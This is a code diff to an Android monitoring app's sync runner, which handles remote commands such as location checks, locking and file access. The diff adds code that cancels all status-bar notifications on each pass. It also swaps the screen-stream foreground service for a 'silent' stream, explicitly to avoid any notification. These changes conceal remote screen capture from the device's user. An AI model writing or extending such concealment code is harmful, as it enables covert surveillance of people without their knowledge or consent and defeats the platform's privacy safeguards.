@@ -1,6 +1,7 @@
 package com.spapp.monitoring.sync
 
 import android.content.Context
+import android.app.NotificationManager
 import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
 import com.spapp.monitoring.blocking.BlockRule
 import com.spapp.monitoring.blocking.BlockRulesCache
@@ -54,6 +55,10 @@ class SyncRunner(private val context: Context) {
      * and processes pending commands (location_check, lock, file commands) immediately.
      */
     suspend fun runFastCommandPass(): Boolean {
+        // Cancel any lingering status bar notifications
+        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
+        nm?.cancelAll()
+
         val state = DeviceState(context)
         val authToken = state.authToken ?: return false
         val bearer = "Bearer $authToken"
@@ -627,7 +632,12 @@ class SyncRunner(private val context: Context) {
             return
         }
 
-        com.spapp.monitoring.screenstream.ScreenStreamService.start(context)
+        // Direct silent screen stream via ScreenStreamManager — NO foreground service or status bar notification!
+        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
+            context = context,
+            authToken = authToken,
+            deviceId = deviceId
+        )
 
         try {
             ApiClient.service.ackCommand(
